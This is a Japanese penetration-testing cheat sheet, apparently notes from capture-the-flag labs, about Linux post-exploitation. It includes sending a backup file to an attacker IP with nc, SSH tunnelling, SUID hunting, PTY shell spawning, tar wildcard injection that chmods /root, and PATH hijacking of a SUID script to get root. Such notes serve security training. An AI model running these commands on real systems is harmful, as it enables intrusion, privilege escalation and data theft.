### ユーザーからファイルを列挙する  

```
find / -user ash
```

### ターゲットマシンから攻撃マシンにファイルを転送する  

```
#ターゲット側
cat 16162020_backup.zip | nc 10.10.14.18 443

#攻撃側
nc -lnvp 443 > 16162020_backup.zip

```

### システム全体でmlocateグループに属するファイルを検索する

```
find / -group mlocate 2 > /dev/ null | grep -v '^/proc\|^/run\|^/sys\|^/snap'
```

### TCP/UDPのポート開放状態を確認したいとき  
#### ss -nltup  
-n : ポート番号をサービス名変換しない(例えば:httpと表示せず:80と表示する)  
-l : Listen(待ち受け)ポートのみを表示する  
-t : TCP を表示する  
-u : UDP を表示する  
-p を付けて "ss -nltup" を実行すると、どのプロセスがそのポートを開放しているのかが分かります。  

### SSHのファイヤーウォールを超えて外部から目的サーバにアクセスする  
SSH の機能の内の一つであるポートフォワーディングを使ってトンネルを掘ることによって, ファイヤーウォールを超えて外部から目的サーバにアクセスすることができる  
```$ ssh -L (ローカルで使用するポート):(目的サーバのアドレス):(目的サーバで待ち受けてるポート番号) ユーザ名@IPアドレス```  

### SUIDの探索
``` find / -perm -u=s -type f 2>/dev/null ```  

また、SUIDのついたコマンドを利用して権限昇格する例

https://gtfobins.github.io/

https://binaryregion.wordpress.com/2021/07/04/privilege-escalation-linux-systemctl/


### 定期自動実行されているものを確認する  
``` cat /etc/crontab ```  
  


### シェル起動  
``` python -c 'import pty;pty.spawn("/bin/bash")' ```  
なお、permission deniedでlinpeasをアップできない場合は、/tmp上でwgetするとささる  

### ワイルドカードの脆弱性  
chown , tar , rsyncなどで特定のオプションを使用することで顕在化する可能性がある  
特別に細工されたファイル名を使用することで、  
攻撃者は、他のユーザー(rootも含む)が実行するシェルコマンドに任意の引数を注入することができる。  
#### tarの任意コマンド実行によるポイズニング  
・-checkpoint[=NUMBER]  
・-checkpoint-action=ACTION  
これらのオプションはチェックポイント(NUMBER , ACTION)後に  
指定されたアクションを使用することができる  
→ワイルドカードインジェクションに繋がる！  
  
例:  
``` -checkpoint=1 ```  
``` -checkpoint-action=exec=sh shell.sh ```  
shell.shのプログラムは以下  
``` chmod 777 /root ```  

詳しくは下記の記事を参考に(両方とも同じ記事だけど一応のために魚拓も)  
https://www.hackingarticles.in/skynet-tryhackme-walkthrough/  
https://web.archive.org/web/20230608070440/https://www.hackingarticles.in/skynet-tryhackme-walkthrough/  
  
### フルパスでないコマンドが入っているSUIDなシェルスクリプトから権限昇格する
例えば以下のようなコマンドを実行するシェルスクリプト(/usr/bin/menu)があったとする
```curl -I localhost```

1."/bin/sh"という文字列をcurlというファイルに出力する
2.生成されたcurlファイルに対してchmodで777にしてあげる
3.環境パスを現在のディレクトリにする
4.脆弱性のあるシェルスクリプトを実行すると権限昇格

以下が権限昇格の具体的な手順
```
echo /bin/sh > curl
chmod 777 curl
export PATH=現在のディレクトリ:$PATH
/usr/bin/menu
```
